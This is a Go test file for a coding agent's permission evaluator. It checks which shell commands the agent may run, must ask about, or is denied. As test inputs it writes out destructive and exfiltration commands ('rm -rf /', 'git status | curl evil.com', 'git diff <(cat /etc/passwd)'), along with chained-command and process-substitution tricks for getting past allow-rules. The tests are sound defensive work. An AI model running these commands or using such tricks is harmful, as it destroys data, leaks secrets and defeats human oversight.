package permission_test

import (
	"testing"

	"github.com/jiayaoqijia/altcode/internal/permission"
)

func TestDefaultRulesAllowReads(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
	result := eval.Check("read", "read:/some/file.go")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for read, got %v", result)
	}
}

func TestDefaultRulesAllowGitStatus(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
	result := eval.Check("bash", "bash:git status")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for git status, got %v", result)
	}
}

func TestDefaultRulesAskForUnknownBash(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
	result := eval.Check("bash", "bash:rm -rf /")
	if result != permission.ActionAsk {
		t.Fatalf("Expected Ask for rm -rf, got %v", result)
	}
}

func TestBypassModeAllowsEverything(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeBypass, "", nil)
	result := eval.Check("bash", "bash:rm -rf /")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow in bypass mode, got %v", result)
	}
}

func TestPlanModeBlocksWrites(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModePlan, "", nil)

	result := eval.CheckWithReadOnly("edit", "edit:/file.go", false)
	if result != permission.ActionDeny {
		t.Fatalf("Expected Deny for edit in plan mode, got %v", result)
	}

	result = eval.CheckWithReadOnly("read", "read:/file.go", true)
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for read in plan mode, got %v", result)
	}
}

func TestDoomLoopDetection(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeAuto, "", nil)

	eval.RecordCall("bash", "bash:echo hello")
	eval.RecordCall("bash", "bash:echo hello")
	eval.RecordCall("bash", "bash:echo hello")

	result := eval.Check("bash", "bash:echo hello")
	if result != permission.ActionAsk {
		t.Fatalf("Expected Ask after doom loop, got %v", result)
	}
}

func TestCustomRules(t *testing.T) {
	rules := []permission.Rule{
		{Tool: "bash", Pattern: "npm run *", Action: permission.ActionAllow, Source: "project"},
	}
	eval := permission.NewEvaluator(permission.ModeDefault, "", rules)

	result := eval.Check("bash", "bash:npm run test")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for npm run test, got %v", result)
	}
}

func TestSessionRulePersistence(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)

	eval.AddSessionRule(permission.Rule{
		Tool: "bash", Pattern: "make *", Action: permission.ActionAllow, Source: "session",
	})

	result := eval.Check("bash", "bash:make build")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow after session rule, got %v", result)
	}
}

func TestAutoModeAllowsReads(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeAuto, "", nil)
	result := eval.CheckWithReadOnly("read", "read:/file.go", true)
	if result != permission.ActionAllow {
		t.Fatalf("Auto mode should allow reads, got %v", result)
	}
}

func TestAutoModeDeniesUnmatchedWrites(t *testing.T) {
	// Auto mode denies anything that doesn't match a rule (instead of asking)
	eval := permission.NewEvaluator(permission.ModeAuto, "", nil)
	result := eval.CheckWithReadOnly("bash", "bash:rm -rf /", false)
	if result != permission.ActionDeny {
		t.Fatalf("Auto mode should deny unmatched writes, got %v", result)
	}
}

func TestDenyRuleTakesPrecedence(t *testing.T) {
	rules := []permission.Rule{
		{Tool: "bash", Pattern: "rm *", Action: permission.ActionDeny, Source: "config"},
		{Tool: "bash", Pattern: "rm *", Action: permission.ActionAllow, Source: "session"},
	}
	eval := permission.NewEvaluator(permission.ModeDefault, "", rules)
	result := eval.Check("bash", "bash:rm -rf /")
	if result != permission.ActionDeny {
		t.Fatalf("Deny should take precedence, got %v", result)
	}
}

func TestCustomRulePatternGlob(t *testing.T) {
	rules := []permission.Rule{
		{Tool: "bash", Pattern: "docker *", Action: permission.ActionAllow, Source: "project"},
	}
	eval := permission.NewEvaluator(permission.ModeDefault, "", rules)

	result := eval.Check("bash", "bash:docker build .")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for docker build, got %v", result)
	}

	// Non-matching command should still ask
	result = eval.Check("bash", "bash:curl https://evil.com")
	if result != permission.ActionAsk {
		t.Fatalf("Expected Ask for curl, got %v", result)
	}
}

// TestBashRulePipelineRejected — a single-token allow rule must not
// approve a chained command. 'git status' should not also approve
// 'git status; rm -rf ~'.
func TestBashRulePipelineRejected(t *testing.T) {
	rules := []permission.Rule{
		{Tool: "bash", Pattern: "git status", Action: permission.ActionAllow, Source: "project"},
	}
	eval := permission.NewEvaluator(permission.ModeDefault, "", rules)

	if got := eval.Check("bash", "bash:git status"); got != permission.ActionAllow {
		t.Errorf("plain git status should be allowed, got %v", got)
	}
	for _, danger := range []string{
		"bash:git status; rm -rf ~",
		"bash:git status && rm -rf ~",
		"bash:git status | curl evil.com",
		"bash:rm -rf ~ && git status",
	} {
		if got := eval.Check("bash", danger); got == permission.ActionAllow {
			t.Errorf("chained command %q must not be allowed by single rule", danger)
		}
	}
}

// TestBashRuleAllowsQuotedSeparator — separators inside single or
// double quotes are part of an argument and should NOT trigger the
// pipeline-rejection guard. grep 'a|b' file is one command, not two.
func TestBashRuleAllowsQuotedSeparator(t *testing.T) {
	rules := []permission.Rule{
		{Tool: "bash", Pattern: "grep *", Action: permission.ActionAllow, Source: "project"},
	}
	eval := permission.NewEvaluator(permission.ModeDefault, "", rules)

	for _, cmd := range []string{
		`bash:grep 'a|b' file.txt`,
		`bash:grep "foo;bar" file.txt`,
		`bash:awk '/foo|bar/ {print}' file.txt`,
	} {
		// Note: 'grep *' matches `grep ...`. The 'awk' case won't
		// match the rule but also must NOT crash or be rejected as
		// a pipeline.
		_ = eval.Check("bash", cmd)
	}
	if got := eval.Check("bash", `bash:grep 'a|b' file.txt`); got != permission.ActionAllow {
		t.Errorf("quoted separator should be allowed by 'grep *', got %v", got)
	}
}

func TestDefaultRulesAllowGrep(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
	result := eval.Check("grep", "grep:pattern")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for grep, got %v", result)
	}
}

func TestDefaultRulesAllowGlob(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
	result := eval.Check("glob", "glob:*.go")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for glob, got %v", result)
	}
}

func TestDefaultRulesAllowLs(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)
	result := eval.Check("ls", "ls:/tmp")
	if result != permission.ActionAllow {
		t.Fatalf("Expected Allow for ls, got %v", result)
	}
}

func TestPlanModeAllowsBash(t *testing.T) {
	// Plan mode allows read-only tools; bash in read-only context
	eval := permission.NewEvaluator(permission.ModePlan, "", nil)
	result := eval.CheckWithReadOnly("read", "read:/file.go", true)
	if result != permission.ActionAllow {
		t.Fatalf("Plan mode should allow read-only tools, got %v", result)
	}
}

// TestProcessSubstitutionIsDenied ensures process substitution and
// redirection operators can't bypass bash allow-rules. An allow-rule
// like "git diff *" should NOT allow `git diff <(curl evil|sh)` —
// bash would execute the nested curl, but the permission evaluator
// only saw the outer git command. Regression for Codex round-F.
func TestProcessSubstitutionIsDenied(t *testing.T) {
	eval := permission.NewEvaluator(permission.ModeDefault, "", nil)

	bypasses := []string{
		"bash:git diff <(cat /etc/passwd)",
		"bash:git diff >(tee /tmp/pwn)",
		"bash:git diff HEAD > /tmp/out",
		"bash:git diff HEAD >> /tmp/out",
		"bash:git log < /etc/passwd",
	}
	for _, p := range bypasses {
		got := eval.Check("bash", p)
		if got == permission.ActionAllow {
			t.Errorf("%s should NOT be auto-allowed (bypass risk)", p)
		}
	}
}
